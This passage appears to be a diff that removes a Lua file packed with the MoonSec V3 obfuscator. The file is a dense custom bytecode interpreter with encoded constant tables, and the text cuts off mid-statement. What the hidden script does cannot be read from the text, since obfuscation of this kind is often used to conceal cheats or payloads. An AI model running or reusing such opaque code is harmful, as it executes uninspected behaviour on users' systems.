@@ -1,1 +1,452 @@
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _WqgQVbtOlsmW = a; end)); return(function(b,...)local l;local o;local c;local d;local a;local f;local e=24915;local n=0;local t={};while n<945 do n=n+1;while n<0x398 and e%0x1926<0xc93 do n=n+1 e=(e+290)%9054 local r=n+e if(e%0x1abc)<=0xd5e then e=(e*0x2bd)%0x479d while n<0x1da and e%0xbf4<0x5fa do n=n+1 e=(e*243)%24921 local d=n+e if(e%0x171c)>=0xb8e then e=(e+0x27c)%0x38fd local e=9454 if not t[e]then t[e]=0x1 f=string;end elseif e%2~=0 then e=(e+0x165)%0x8680 local e=47402 if not t[e]then t[e]=0x1 l=getfenv and getfenv();end else e=(e*0x27c)%0x682b n=n+1 local e=63921 if not t[e]then t[e]=0x1 a={};end end end elseif e%2~=0 then e=(e+0xb8)%0x6b62 while n<0x19f and e%0x4884<0x2442 do n=n+1 e=(e-507)%9280 local r=n+e if(e%0x2fd0)>=0x17e8 then e=(e+0x89)%0xa91d local e=59277 if not t[e]then t[e]=0x1 end elseif e%2~=0 then e=(e-0x92)%0x30c2 local e=57753 if not t[e]then t[e]=0x1 d=function(d)local e=0x01 local function t(n)e=e+n return d:sub(e-n,e-0x01)end while true do local n=t(0x01)if(n=="\5")then break end local e=f.byte(t(0x01))local e=t(e)if n=="\2"then e=a.tHytwcOi(e)elseif n=="\3"then e=e~="\0"elseif n=="\6"then l[e]=function(n,e)return b(8,nil,b,e,n)end elseif n=="\4"then e=l[e]elseif n=="\0"then e=l[e][t(f.byte(t(0x01)))];end local n=t(0x08)a[n]=e end end end else e=(e-0x1b0)%0x1f82 n=n+1 local e=70630 if not t[e]then t[e]=0x1 o="\4\8\116\111\110\117\109\98\101\114\116\72\121\116\119\99\79\105\0\6\115\116\114\105\110\103\4\99\104\97\114\70\66\72\107\97\71\122\81\0\6\115\116\114\105\110\103\3\115\117\98\95\111\67\105\111\73\108\101\0\6\115\116\114\105\110\103\4\98\121\116\101\82\70\95\82\65\70\89\95\0\5\116\97\98\108\101\6\99\111\110\99\97\116\107\110\104\84\98\115\118\85\0\5\116\97\98\108\101\6\105\110\115\101\114\116\110\106\65\109\86\111\76\66\5";end end end else e=(e-0x90)%0x7e14 n=n+1 while n<0x2be and e%0x41d4<0x20ea do n=n+1 e=(e-180)%46594 local d=n+e if(e%0x2d74)<0x16ba then e=(e*0x257)%0xb323 local e=29990 if not t[e]then t[e]=0x1 l=(not l)and _ENV or l;end elseif e%2~=0 then e=(e*0x2fd)%0x67c2 local e=53261 if not t[e]then t[e]=0x1 c=tonumber;end else e=(e+0xcd)%0x94cc n=n+1 local e=61455 if not t[e]then t[e]=0x1 end end end end end e=(e*727)%48177 end d(o);local n={};for e=0x0,0xff do local t=a.FBHkaGzQ(e);n[e]=t;n[t]=e;end local function h(e)return n[e];end local o=(function(r,d)local o,t=0x01,0x10 local n={{},{},{}}local l=-0x01 local e=0x01 local f=r while true do n[0x03][a._oCioIle(d,e,(function()e=o+e return e-0x01 end)())]=(function()l=l+0x01 return l end)()if l==(0x0f)then l=""t=0x000 break end end local l=#d while e<l+0x01 do n[0x02][t]=a._oCioIle(d,e,(function()e=o+e return e-0x01 end)())t=t+0x01 if t%0x02==0x00 then t=0x00 a.njAmVoLB(n[0x01],(h((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+f)%0x100)));f=r+f;end end return a.knhTbsvU(n[0x01])end);d(o(62,"JsiIEOAWX/!y.R:^.W"));d(o(145,"Ye1w6C(t/cf:!^5}(}56!*wlc^,wtt^}5::fwffeewC}^tCcf(1^/C}/tf/5}5^/wfft1ecq^:tc5C11!(1/f1}}k!t}Cc!fwAf6ecCc5^Ce^fe1ce}(///!de^^6^:f1_c6}!zc5z6w!C1wct}}6}!:Ccf!1bf(1ee(/c(e!66(fc:C/:}1(1566::ewec/Gwtw5iCw:1!(w^ewt6}1Cf!ew}c:e^tc5c(1!f61f} ft(jfC5^16fCj!1/>}5(:5:CC!t}tt5x6C(^cCefe;}c%f}e5,ECc^-6fffe^(!}6(1:wwtfe:}1^^6C:55Cbf5w}fCe5/e/(}c^6w5:e1e/5}6(/^*6fc}1fc1}:Cw:}w/Cv!6f1}5(55t6}C}w^fCe(t(5tC5!C6fc}}e/^}(w^:!^56}1^cCv(((^t65!/)1/1R6CC^!Cwf}!5w5e//c5}(w^/6f/w16t/5((1!e1^Ce!1c^=ttf5fCt:^wecc5wC^!1w}!(w}/!}5e}/^(t^/w5:11t/(Jh(5^f6w!(Q/tfc54}5:6!!11fctett/556/!vwf:t5}(^/f}^^Cw/:fe^1c}c(55<6}!e,5f13//-5t6wf:e(w:"));JuTdlqzPzbFYmXP=function(e)e((-12658+(function()local t,n=0,1;(function(n,e)e(e(e,e),n(e and n,e))end)(function(l,e)if t>213 then return e end t=t+1 n=(n*992)%24682 if(n%1674)>=837 then return e(e(l,e),l(e,e and e))else return e end return l end,function(e,l)if t>395 then return e end t=t+1 n=(n+557)%17522 if(n%612)<306 then n=(n-74)%29980 return e(e(e,e),e(e,e))else return e end return l end)return n;end)()))end;PXmYFbzPzqldTuJ={a.rXtmgPMW,a.wAsXWdTQ};local e=(-3934+(function()local f,t=0,1;(function(n,e,l,t)e(e(n and t,e,t,e),e(t,t,n,n),n(l,l,e,n),l(n,e,t,n)and l(t and t,l,e,n))end)(function(e,n,l,d)if f>152 then return n end f=f+1 t=(t*591)%20067 if(t%724)>362 then return e(e(e,e,n,e)and e(n and n,e,d and n,d and l),e(d,e,n and e,e and l)and d(n,l and l,e,e),n(n,e,l,l and l),e(n,d,l,d))else return n end return n end,function(d,l,n,e)if f>308 then return e end f=f+1 t=(t*104)%32926 if(t%1846)<=923 then t=(t-414)%10775 return n(e(e,e,e,e),l(n and l,d,n,e),d(d,l,e and n,n),e(l and l,n,n,l)and d(d,l and d,n,d))else return n end return l end,function(l,n,d,e)if f>300 then return l end f=f+1 t=(t-1022)%18225 if(t%632)<316 then t=(t-344)%24920 return d else return n(d(n and l,n,l,e and d),l(n,e,e,e)and n(d,l,n and l,e),n(l and l,l,e and d,n and l),d(n,d and e,d,l)and e(n and l,n and e,e,d))end return l(e(e,e,e,n)and l(d,n and d,e,d and e),e(d,e,n,e),d(l,e,e,l),e(e,n,n and d,n))end,function(e,d,l,n)if f>117 then return n end f=f+1 t=(t+665)%34101 if(t%1728)>=864 then return e else return d(l(n,d,n,e),e(n,e and n,e and n,n and e),e(l,e,l,n),l(n and d,e,l,e))end return d(e(e,e,e,l),e(n,e and d,e,d),l(e,n,d,e),e(l,e,e and e,l and d))end)return t;end)())local de=(getfenv)or(function()return _ENV end);local s=a.vAReG_gT or a.cy_BoiAQ;local l=2;local d=3;local r=4;local ee=1;local function te(m,...)local h=o(e,"3^ReATCStH7ImxqDTeS7ISDAeeSm7IqtRTCOqR^SCq7^mtB7Te7RI7^ATttDICI7DIeRCD7mqSS7IHqxRDSRTHImx^nqAItCDxAqtmxeIxA tfmiDCqqtR7HDtqRCD7qqtR7TtHeq^JDAIAAxt2SADtESTxDeqSIISxHRtCeTxx2q7^RTmt7mS:AtIDe4DTm7^qeRHem7emtqHeHt7IRqSxCRIAqtImt_eSexRXDAICxImDSe2C^IDD7RqS%7CqDa^TDHSxA^RTtCtxt^TTOeHtAI^qqRICCxH^qSdHHme^mS^tAqI^DTStmIH^SRHe7SxIRqDRmCSxReIStI^mTR4CmTeHAmIbtATDTeeCq7RqA^7DRetC77SqA^D7qqq^xTx7HqSRRTCHtmqmRB^e7SSIACT7SxI xqSRHTDHmxHSmmR%ReRCI77qmme;ReIStITTA7tqn)qqtRSCMHxx7S7ImDRAp_xAItTmRDD7Dqq^tDCe.Cx77qSRAC^tq^7^ITTHRmDdmAHCCeRA?eDSDISDAe^CmDCRxSC7I7^Dx^HTCHemqTH7RxD^tTtTmtqmIAHSSmCoAeRS6maIRRRCq7I7SJtRC7txT^Re^S^mDmmAmStmI7DqDRSCA7^TRSmI7/^eS^^TTtHmCJeeqxT1xAqtmmSDIexSeCt7RxD^mTHHCxe^_AxtxmShAA^SqIIDteTIR7DqqRHCC7eqS^xT7HSxS^^AqtImtiTARSDDmDmeCSeI%qxR7CSHARvRoC&HtxT^RmeqxRISR7ttRmeD7eSSARACRHxx^^eAHRRTmHHxC^eTftxe7ASACtRIqDIetSeIAqDRmCH7CqAR^TxH7xS^AT^tqmI27ATtRIDDmeDSCIeD>RxSe7SqCR^TqHIxt^TTRHzmm0mACtAmBDxe7SSmAD^eRCI7HqTRRTDHmDT^CTCHomDv7AHtAm^*xeIS7ITDRRDCD7HqCABC_Hxx7^tTAH^mqeqAttTmRDDCISHISDee1Cx77qSRASeHqxx^tTTHRmD{mAHmTmeb^exSmISDCe^HAxeqtRCCR7Txm^7TCHCx#^^A7tSmA-^AASIIHDTeCCD7mqHRCS(78xq^7TSmex^NDAItHmTcReDSmmIDCeTSO7xq7RSCA7S^e^ITIHTxRLDAxtHmt?eAiIFI7DSeAS^7qqIRtCT7SxD^mTHHtxe^.Axt7^xfAARSqIqDteCSRIeqmRHCC7e^^^xTIHSxAAkAqtmmtwTARSDImDHAtSeIRqxR7CS7Aq^^qH7HtxC^RT^tmmIYCCHttIxDIeS7TI^qDRICm7TqC^DTmHHxCAATjtqm7zStSt^IDDIetSTIRqDe7tx7CqTR(tqH7xt^ATRtqmDNtATtRIDRxeHSSIeDPTmC77tqARATqHIxt^TSxtDmqBHACtemdDxAmSqIADARqCx7tqTRRS^7IxH^7TeHRmxs7AStAmDDqemStIHDRe^CmmDDAReC^Hx<I^STTH^xA_IAmtTmRDDem77ICDAeOSDxqqSRTC^7TxI^tTT7A=elmAItCmA!{exS7ISeSe^S^7IqtRTCRHDqqAxTCHSx&MDA7tSmABTSISII7DTCRCD7xqHRCST7<qe^7TtHAx^WqAImtmTbHeDtNIHDCeeS+mSq7RDCA7Txq^ITtHTqx-DTTtHmHheA/SxI7^AeASI7qqIRtCT7RxDRSTH7^xe^TAxt7mSaAATSqmSDte7SR7DqmRHSx7eqH^xCCHSxC^^Aqmmmt%xARtSIm(ReCSeDTqxeeCS7Hq^^qTIHtqe^RTStmx^5CAmtaxx:DeSSmI^DCRICx7TqRRATm7jxC^7TbHTm7vSTxt^IDDIeqSTIHqDesSm7CqTRkSqH7xt^AT^q^mIlHATtAIDDmeHSC{CDjRxC77HqAR^TqHIDt^TTRtDmxKHACtemEDxe7SSITD^RqCI7tqSRRTDHmxHR^TeHumx;7AStAm^DqTIStITDRe}Cm7HqCCtC_Hxx7RH7tH^mqfIAmtTmRDDARSmICDee S^77qtRACRHqxD^tTTHRmD^fAHtSme-AexS7ISDAC^Cq7mqtRTSHHDxm^HTCHexgNxA7t7mAdReqSIItDTeRCDmtqHRCCe7_xx^ITSIAqH5qAIttmTXRAqSmmIRqeeS^7xDDRSCA7^DVeRTtHSxR^eAmtHmC.HSTSxIxDSeTS^7DqIRHCT7R^R^mTHHCxA^bAxt7mSTRA^t%IID7eTSe7DDqeqCC7TqfRST7HSxAReCetImIGTA7SDImDHTCSDIJD}R7C77AqD^qCx7mxT^CADHDmHaCAe7KmDD7eISAITqqeCCtISq7^DC^HHxq^eTJtxq7^DAAtCIq-settRIRG^SACH7mqeRtTxH7xSeATRtqx^PtAItRmIDmeHttIeDSRxC77SqAR^SWIRxt^xTR7Amm&HACHTmCDxAeSSmAD^RqCII7D^RRCHHmqt^CTeHMx^^HAStmm^^DeISHITDRA^CmITqCRtC>Hxx7^SCDH^xI,ITetTmRDDemHTICDDeUCD77qHRAC^7DxI^DTTHxmD^tAHtCxx&;AAS7meDAemCq7DDIRTC7HDDS^HTSHexZeSA7tDmAYHeqSIItDICSCDIAqHRCCe7^xxRzTSHAWA,qAIttmS)ReDSmIHRHeeS_7xqqRSCA7^xqAqTtHTxR^SAmtHmCNeSeSxI7DSeSS^7qqIRtHt7RxD^mCFHCxe^aAxIxmS(AA^SDIIDteTSRImqmeRCC7Iq?^xT7HSxt^^TttImtdTARSDIm^AeCSmI-qDR7CH7Aq^RHTIHtxT^IADtmmHyCTSt,IxD7eHSAI^qqRICx7TqR^DTmHHxC^eTAHIm7:SAAmTIqDmettSx>qDRmCH7mqeRdTxI7xI^AT^tqmIBtTAtRx^sDeHSCIewARxC77SDCemTqHIxt^ITRtDmmRHCetemYDxe7SSm7D^AMSx7tqTRRC^HmxH^CTeHtmx+7AStTm^DqeIt7IDDRRDCm7qqCReCa7DDt^STAH^mD-IAttTqt>SemSHICRDeBCq77q7RACTHqxI^tTTmqmD(xAHt7mewwexS7DADAeRCq7I{tRTCRHDxx^HTCHeqRRIA7tSmA:7eqSIIt=SSxCD7xqHeSCe7hxxe7C7HAxR,qAmttmmrRT^tCIHDHeetR7xq7RSCAIAxq^mTtHtxRXDAmtHxe5eAMSxI7DSeCS^7q#CRtCT7Rq;^mT7HCxeeOAxt7mSJTA^SqII");local n=0;a.HwtBwjuc(function()a.eiIbaCXS()n=n+1 end)local function e(e,t)if t then return n end;n=e+n;end local t,n,o=b(0,b,e,h,a.RF_RAFY_);local function f()local t,n=a.RF_RAFY_(h,e(1,3),e(5,6)+2);e(2);return(n*256)+t;end;local u=true;local u=0 local function p()local l=n();local e=n();local d=1;local l=(t(e,1,20)*(2^32))+l;local n=t(e,21,31);local e=((-1)^t(e,32));if(n==0)then if(l==u)then return e*0;else n=1;d=0;end;elseif(n==2047)then return(l==0)and(e*(1/0))or(e*(0/0));end;return a.gxplmko_(e,n-1023)*(d+(l/(2^52)));end;local k=n;local function _(n)local t;if(not n)then n=k();if(n==0)then return'';end;end;t=a._oCioIle(h,e(1,3),e(5,6)+n-1);e(n)local e=""for n=(1+u),#t do e=e..a._oCioIle(t,n,n)end return e;end;local k=#a.rXtmgPMW(c('\49.\48'))~=1 local e=n;local function le(...)return{...},a.fmXalzCR('#',...)end local function ne()local u={};local c={};local e={};local s={u,c,nil,e};local e=n()local h={}for l=1,e do local t=o();local e;if(t==0)then e=(o()~=#{});elseif(t==3)then local n=p();if k and a.aBOnRWnz(a.rXtmgPMW(n),'.(\48+)$')then n=a.PulumZSO(n);end e=n;elseif(t==2)then e=_();end;h[l]=e;end;s[3]=o();for e=1,n()do c[e-(#{1})]=ne();end;for c=1,n()do local e=o();if(t(e,1,1)==0)then local o=t(e,2,3);local a=t(e,4,6);local e={f(),f(),nil,nil};if(o==0)then e[d]=f();e[r]=f();elseif(o==#{1})then e[d]=n();elseif(o==m[2])then e[d]=n()-(2^16)elseif(o==m[3])then e[d]=n()-(2^16)e[r]=f();end;if(t(a,1,1)==1)then e[l]=h[e[l]]end if(t(a,2,2)==1)then e[d]=h[e[d]]end if(t(a,3,3)==1)then e[r]=h[e[r]]end u[c]=e;end end;return s;end;local function te(t,e,n)local l=e;local l=n;return c(a.aBOnRWnz(a.aBOnRWnz(({a.HwtBwjuc(t)})[2],e),n))end local function _(g,u,c)local function ne(...)local o,j,f,ne,p,t,h,k,z,y,m,n;local e=0;while-1<e do if 3<=e then if 5>e then if 2<e then repeat if 4~=e then k={};z={...};break;end;y=a.fmXalzCR('#',...)-1;m={};until true;else k={};z={...};end else if e>=3 then for t=37,63 do if e>5 then e=-2;break;end;n=b(7);break;end;else n=b(7);end end else if e>=1 then if e~=-1 then for n=38,65 do if 2>e then f=b(6,14,3,17,g);p=le ne=0;break;end;t=-41;h=-1;break;end;else t=-41;h=-1;end else o=b(6,4,1,41,g);j=b(6,98,2,7,g);end end e=e+1;end;for e=0,y do if(e>=f)then k[e-f]=z[e+1];else n[e]=z[e+1];end;end;local b=y-f+1 local e;local f;local function z(...)while true do end end while true do if t<-40 then t=t+42 end e=o[t];f=e[ee];if f>42 then if f>=65 then if f<76 then if 69>=f then if 66>=f then if 65<f then if(e[l]<n[e[r]])then t=t+1;else t=e[d];end;else n[e[l]]=n[e[d]][n[e[r]]];end else if 68>f then n[e[l]]=#n[e[d]];else if f~=69 then if(n[e[l]]~=e[r])then t=t+1;else t=e[d];end;else local h,a;for f=0,4 do if f<2 then if-3<f then repeat if f<1 then n[e[l]]=u[e[d]];t=t+1;e=o[t];break;end;n[e[l]]=n[e[d]]+n[e[r]];t=t+1;e=o[t];until true;else n[e[l]]=n[e[d]]+n[e[r]];t=t+1;e=o[t];end else if f>=3 then if 4>f then n[e[l]]=n[e[d]][n[e[r]]];t=t+1;e=o[t];else h=e[d];a=n[h]for e=h+1,e[r]do a=a..n[e];end;n[e[l]]=a;end else n[e[l]]=n[e[d]]%e[r];t=t+1;e=o[t];end end end end end end else if 73>f then if f>70 then if 67~=f then repeat if f>71 then local f,a,s;for h=0,6 do if 3<=h then if h<5 then if h==3 then n(e[l],e[d]);t=t+1;e=o[t];else n(e[l],e[d]);t=t+1;e=o[t];end else if 2<=h then for r=10,98 do if h>5 then f=e[l];a=n[f]s=n[f+2];if(s>0)then if(a>n[f+1])then t=e[d];else n[f+3]=a;end elseif(a<n[f+1])then t=e[d];else n[f+3]=a;end break;end;n(e[l],e[d]);t=t+1;e=o[t];break;end;else f=e[l];a=n[f]s=n[f+2];if(s>0)then if(a>n[f+1])then t=e[d];else n[f+3]=a;end elseif(a<n[f+1])then t=e[d];else n[f+3]=a;end end end else if h>=1 then if h>0 then repeat if h~=2 then n[e[l]]=n[e[d]][e[r]];t=t+1;e=o[t];break;end;n[e[l]]={};t=t+1;e=o[t];until true;else n[e[l]]=n[e[d]][e[r]];t=t+1;e=o[t];end else n[e[l]]=c[e[d]];t=t+1;e=o[t];end end end break;end;if not n[e[l]]then t=t+1;else t=e[d];end;until true;else local f,a,s;for h=0,6 do if 3<=h then if h<5 then if h==3 then n(e[l],e[d]);t=t+1;e=o[t];else n(e[l],e[d]);t=t+1;e=o[t];end else if 2<=h then for r=10,98 do if h>5 then f=e[l];a=n[f]s=n[f+2];if(s>0)then if(a>n[f+1])then t=e[d];else n[f+3]=a;end elseif(a<n[f+1])then t=e[d];else n[f+3]=a;end break;end;n(e[l],e[d]);t=t+1;e=o[t];break;end;else f=e[l];a=n[f]s=n[f+2];if(s>0)then if(a>n[f+1])then t=e[d];else n[f+3]=a;end elseif(a<n[f+1])then t=e[d];else n[f+3]=a;end end end else if h>=1 then if h>0 then repeat if h~=2 then n[e[l]]=n[e[d]][e[r]];t=t+1;e=o[t];break;end;n[e[l]]={};t=t+1;e=o[t];until true;else n[e[l]]=n[e[d]][e[r]];t=t+1;e=o[t];end else n[e[l]]=c[e[d]];t=t+1;e=o[t];end end end end else local l=e[l];local f=n[l]local o=n[l+2];if(o>0)then if(f>n[l+1])then t=e[d];else n[l+3]=f;end elseif(f<n[l+1])then t=e[d];else n[l+3]=f;end end else if f>=74 then if 70~=f then repeat if f<75 then for e=e[l],e[d]do n[e]=nil;end;break;end;local f,u,k,b,m;for a=0,5 do if a>2 then if 3>=a then f=e[l]k,b=p(n[f](s(n,f+1,e[d])))h=b+f-1 m=0;for e=f,h do m=m+1;n[e]=k[m];end;t=t+1;e=o[t];else if a~=1 then repeat if a~=5 then f=e[l]n[f]=n[f](s(n,f+1,h))t=t+1;e=o[t];break;end;n[e[l]]();until true;else n[e[l]]();end end else if a<1 then n[e[l]]=c[e[d]];t=t+1;e=o[t];else if-3<a then repeat if 1<a then n(e[l],e[d]);t=t+1;e=o[t];break;end;f=e[l];u=n[e[d]];n[f+1]=u;n[f]=u[e[r]];t=t+1;e=o[t];until true;else f=e[l];u=n[e[d]];n[f+1]=u;n[f]=u[e[r]];t=t+1;e=o[t];end end end end until true;else for e=e[l],e[d]do n[e]=nil;end;end else n(e[l],e[d]);end end end else if 80<f then if f<=83 then if f>=82 then if f>=79 then for t=37,57 do if f<83 then n[e[l]]();break;end;do return n[e[l]]end break;end;else do return n[e[l]]end end else n[e[l]]();end else if 84>=f then for f=0,1 do if f<1 then n[e[l]]=c[e[d]];t=t+1;e=o[t];else if not n[e[l]]then t=t+1;else t=e[d];end;end end else if 84<=f then repeat if 85<f then local t=e[l]n[t](s(n,t+1,e[d]))break;end;local t=e[l]n[t](s(n,t+1,e[d]))until true;else local t=e[l]n[t](s(n,t+1,e[d]))end end end else if f>77 then if f<79 then local a;for f=0,6 do if f>=3 then if f<5 then if f>3 then n[e[l]]=c[e[d]];t=t+1;e=o[t];else n[e[l]]=n[e[d]][e[r]];t=t+1;e=o[t];end else if 5==f then n[e[l]]=n[e[d]][e[r]];t=t+1;e=o[t];else n[e[l]]=c[e[d]];end end else if f>0 then if 1~=f then n[e[l]]=c[e[d]];t=t+1;e=o[t];else n[e[l]]=c[e[d]];t=t+1;e=o[t];end else a=e[l]n[a](n[a+1])t=t+1;e=o[t];end end end else if 77<=f then for t=22,70 do if f~=79 then local t=e[l]local l,e=p(n[t](s(n,t+1,e[d])))h=e+t-1 local e=0;for t=t,h do e=e+1;n[t]=l[e];end;break;end;n[e[l]]={};break;end;else n[e[l]]={};end end else if 76==f then local t=e[l];local l=n[e[d]];n[t+1]=l;n[t]=l[e[r]];else n[e[l]]=n[e[d]]%e[r];end end end end else if f<=53 then if 47>=f then if 45<=f then if 45<f then if 43<=f then for t=32,56 do if f>46 then n[e[l]]=u[e[d]];break;end;c[e[d]]=n[e[l]];break;end;else c[e[d]]=n[e[l]];end else local e=e[l]n[e]=n[e](n[e+1])end else if 41~=f then repeat if 43~=f then n[e[l]]=n[e[d]][n[e[r]]];break;end;local a,m,u,h,c,f,b;for f=0,4 do if 1>=f then if-2<f then repeat if f>0 then f=0;while f>-1 do if f<=2 then if f<=0 then a=e;else if f>0 then for e=28,76 do if 2>f then m=l;break;end;u=d;break;end;else m=l;end end else if f>4 then if f>=1 then for e=33,88 do if f<6 then n(c,h);break;end;f=-2;break;end;else n(c,h);end else if 2<=f then repeat if 3~=f then c=a[m];break;end;h=a[u];until true;else h=a[u];end end end f=f+1 end t=t+1;e=o[t];break;end;n[e[l]]=n[e[d]];t=t+1;e=o[t];until true;else n[e[l]]=n[e[d]];t=t+1;e=o[t];end else if 2<f then if f~=1 then repeat if 4~=f then b=e[l]n[b]=n[b](s(n,b+1,e[d]))t=t+1;e=o[t];break;end;if(n[e[l]]==e[r])then t=t+1;else t=e[d];end;until true;else if(n[e[l]]==e[r])then t=t+1;else t=e[d];end;end else f=0;while f>-1 do if f<=2 then if 0>=f then a=e;else if 0~=f then repeat if f~=2 then m=l;break;end;u=d;until true;else u=d;end end else if f<5 then if f~=4 then h=a[u];else c=a[m];end else if f>=2 then repeat if f~=5 then f=-2;break;end;n(c,h);until true;else n(c,h);end end end f=f+1 end t=t+1;e=o[t];end end end until true;else n[e[l]]=n[e[d]][n[e[r]]];end end else if f>=51 then if 52<=f then if 51<f then for h=33,87 do if 52<f then local s=j[e[d]];local h;local f={};h=a.nlXUz_dm({},{__index=function(n,e)local e=f[e];return e[1][e[2]];end,__newindex=function(t,e,n)local e=f[e]e[1][e[2]]=n;end;});for l=1,e[r]do t=t+1;local e=o[t];if e[ee]==51 then f[l-1]={n,e[d]};else f[l-1]={u,e[d]};end;m[#m+1]=f;end;n[e[l]]=_(s,h,c);break;end;n(e[l],e[d]);break;end;else n(e[l],e[d]);end else local o,a,f,r,c,h;local t=0;while t>-1 do if 3>=t then if 1<t then if t~=-2 then for e=10,61 do if 3~=t then f=d;break;end;r=n;break;end;else f=d;end else if 1==t then a=l;else o=e;end end else if 5>=t then if 4==t then c=r[o[f]];else h=o[a];end else if 2<=t then repeat if 7>t then n[h]=c;break;end;t=-2;until true;else t=-2;end end end t=t+1 end end else if 48>=f then u[e[d]]=n[e[l]];else if f>=47 then for t=41,78 do if f~=50 then do return end;break;end;local t=e[l]n[t]=n[t](s(n,t+1,e[d]))break;end;else local t=e[l]n[t]=n[t](s(n,t+1,e[d]))end end end end else if 58>=f then if f>=56 then if f>=57 then if 56~=f then for s=11,58 do if f~=57 then local s=j[e[d]];local h;local f={};h=a.nlXUz_dm({},{__index=function(n,e)local e=f[e];return e[1][e[2]];end,__newindex=function(t,e,n)local e=f[e]e[1][e[2]]=n;end;});for l=1,e[r]do t=t+1;local e=o[t];if e[ee]==51 then f[l-1]={n,e[d]};else f[l-1]={u,e[d]};end;m[#m+1]=f;end;n[e[l]]=_(s,h,c);break;end;local e=e[l];h=e+b-1;for t=e,h do local e=k[t-e];n[t]=e;end;break;end;else local e=e[l];h=e+b-1;for t=e,h do local e=k[t-e];n[t]=e;end;end else for f=0,1 do if-1~=f then for r=35,96 do if f~=1 then n(e[l],e[d]);t=t+1;e=o[t];break;end;n[e[l]]=c[e[d]];break;end;else n[e[l]]=c[e[d]];end end end else if 55~=f then n[e[l]][n[e[d]]]=n[e[r]];else if not n[e[l]]then t=t+1;else t=e[d];end;end end else if f<=61 then if f>59 then if f~=59 then repeat if f<61 then local u,h,s,f,a,c,o;local t=0;while t>-1 do if 3>t then if t>=1 then if t>-2 then for n=38,91 do if t~=2 then f=e;break;end;a=f[h];break;end;else a=f[h];end else u=l;h=d;s=r;end else if t<5 then if t==4 then o=n[a];for e=1+a,f[s]do o=o..n[e];end;else c=f[u];end else if 6==t then t=-2;else n[c]=o;end end end t=t+1 end break;end;local l=e[l];local f=n[l]local o=n[l+2];if(o>0)then if(f>n[l+1])then t=e[d];else n[l+3]=f;end elseif(f<n[l+1])then t=e[d];else n[l+3]=f;end until true;else local l=e[l];local f=n[l]local o=n[l+2];if(o>0)then if(f>n[l+1])then t=e[d];else n[l+3]=f;end elseif(f<n[l+1])then t=e[d];else n[l+3]=f;end end else n[e[l]]=c[e[d]];end else if f<63 then local t=e[l]local l,e=p(n[t](s(n,t+1,e[d])))h=e+t-1 local e=0;for t=t,h do e=e+1;n[t]=l[e];end;else if 59<=f then for r=34,67 do if 64~=f then local e=e[l]n[e]=n[e](n[e+1])break;end;local f;n[e[l]]=u[e[d]];t=t+1;e=o[t];n[e[l]]=u[e[d]];t=t+1;e=o[t];n[e[l]]=u[e[d]];t=t+1;e=o[t];n[e[l]]=n[e[d]];t=t+1;e=o[t];n[e[l]]=n[e[d]];t=t+1;e=o[t];n[e[l]]=n[e[d]];t=t+1;e=o[t];f=e[l]n[f]=n[f](s(n,f+1,e[d]))break;end;else local f;n[e[l]]=u[e[d]];t=t+1;e=o[t];n[e[l]]=u[e[d]];t=t+1;e=o[t];n[e[l]]=u[e[d]];t=t+1;e=o[t];n[e[l]]=n[e[d]];t=t+1;e=o[t];n[e[l]]=n[e[d]];t=t+1;e=o[t];n[e[l]]=n[e[d]];t=t+1;e=o[t];f=e[l]n[f]=n[f](s(n,f+1,e[d]))end end end end end end else if 21>f then if 9<f then if 14>=f then if 11>=f then if f==10 then local e=e[l];local t=n[e];for e=e+1,h do a.njAmVoLB(t,n[e])end;else u[e[d]]=n[e[l]];end else if f>12 then if f>=10 then for r=32,71 do if 13~=f then local e=e[l]n[e](n[e+1])break;end;local f,s,c,r,h,a;n[e[l]]=n[e[d]];t=t+1;e=o[t];n[e[l]]=n[e[d]];t=t+1;e=o[t];f=e[l]n[f]=n[f](n[f+1])t=t+1;e=o[t];n[e[l]]=n[e[d]];t=t+1;e=o[t];do return n[e[l]]end t=t+1;e=o[t];f=e[l];s={};for e=1,#m do c=m[e];for e=0,#c do r=c[e];h=r[1];a=r[2];if h==n and a>=f then s[a]=h[a];r[1]=s;end;end;end;t=t+1;e=o[t];t=e[d];break;end;else local e=e[l]n[e](n[e+1])end else n[e[l]]=n[e[d]]+n[e[r]];end end else if f<18 then if f>=16 then if 12<=f then repeat if 16~=f then local e=e[l];local t=n[e];for e=e+1,h do a.njAmVoLB(t,n[e])end;break;end;local l=e[l];local o=n[l+2];local f=n[l]+o;n[l]=f;if(o>0)then if(f<=n[l+1])then t=e[d];n[l+3]=f;end elseif(f>=n[l+1])then t=e[d];n[l+3]=f;end until true;else local l=e[l];local o=n[l+2];local f=n[l]+o;n[l]=f;if(o>0)then if(f<=n[l+1])then t=e[d];n[l+3]=f;end elseif(f>=n[l+1])then t=e[d];n[l+3]=f;end end else c[e[d]]=n[e[l]];end else if 18<f then if 20>f then local l=e[l];local o=n[l+2];local f=n[l]+o;n[l]=f;if(o>0)then if(f<=n[l+1])then t=e[d];n[l+3]=f;end elseif(f>=n[l+1])then t=e[d];n[l+3]=f;end else local e=e[l]n[e](n[e+1])end else local f,o,h,c,a,r;local t=0;while t>-1 do if t>=4 then if t<=5 then if 1<t then for e=49,79 do if t~=5 then a=c[f[h]];break;end;r=f[o];break;end;else r=f[o];end else if 3~=t then repeat if t<7 then n[r]=a;break;end;t=-2;until true;else t=-2;end end else if 1>=t then if t~=-3 then for n=27,67 do if t~=1 then f=e;break;end;o=l;break;end;else o=l;end else if 2==t then h=d;else c=n;end end end t=t+1 end end end end else if f<=4 then if f<2 then if-4<=f then repeat if 0<f then n[e[l]]=#n[e[d]];break;end;t=e[d];until true;else t=e[d];end else if 3<=f then if f>3 then n[e[l]]=n[e[d]][e[r]];t=t+1;e=o[t];c[e[d]]=n[e[l]];t=t+1;e=o[t];n[e[l]]=c[e[d]];t=t+1;e=o[t];n[e[l]]=n[e[d]][e[r]];t=t+1;e=o[t];c[e[d]]=n[e[l]];t=t+1;e=o[t];n[e[l]]=(e[d]~=0);t=t+1;e=o[t];c[e[d]]=n[e[l]];else local d,c,f;for r=0,1 do if-3~=r then repeat if 0~=r then d=e[l];f=n[d];for e=d+1,h do a.njAmVoLB(f,n[e])end;break;end;d=e[l];h=d+b-1;for e=d,h do c=k[e-d];n[e]=c;end;t=t+1;e=o[t];until true;else d=e[l];f=n[d];for e=d+1,h do a.njAmVoLB(f,n[e])end;end end end else n[e[l]]=(e[d]~=0);end end else if 7<=f then if 8>f then local f=e[l];local l={};for e=1,#m do local e=m[e];for t=0,#e do local e=e[t];local d=e[1];local t=e[2];if d==n and 